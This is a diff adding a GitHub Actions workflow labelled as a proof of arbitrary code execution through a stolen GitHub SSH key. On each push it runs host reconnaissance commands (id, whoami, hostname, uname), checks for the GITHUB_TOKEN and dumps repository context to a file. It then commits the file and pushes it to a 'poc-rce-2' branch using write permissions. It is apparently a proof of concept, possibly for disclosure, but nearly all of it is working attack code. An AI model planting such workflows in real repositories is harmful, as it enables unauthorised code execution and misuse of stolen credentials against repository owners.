@@ -1,0 +1,24 @@
+name: rce2
+on: [push]
+permissions:
+  contents: write
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Arbitrary command execution
+        run: |
+          {
+            echo "== ARBITRARY CODE EXECUTION via stolen GitHub SSH key =="
+            id; whoami; hostname; uname -a; pwd; date -u
+            echo "== GITHUB CONTEXT =="
+            echo "repo=$GITHUB_REPOSITORY actor=$GITHUB_ACTOR ref=$GITHUB_REF"
+            echo "== token scopes (non-secret metadata) =="
+            echo "GITHUB_TOKEN present: $([ -n "$GITHUB_TOKEN" ] && echo yes || echo no)"
+          } > rce2.txt 2>&1
+      - name: push proof
+        run: |
+          git config user.email "p@e.c"; git config user.name "p"
+          git add rce2.txt; git commit -m "rce2 proof"
+          git push origin HEAD:refs/heads/poc-rce-2
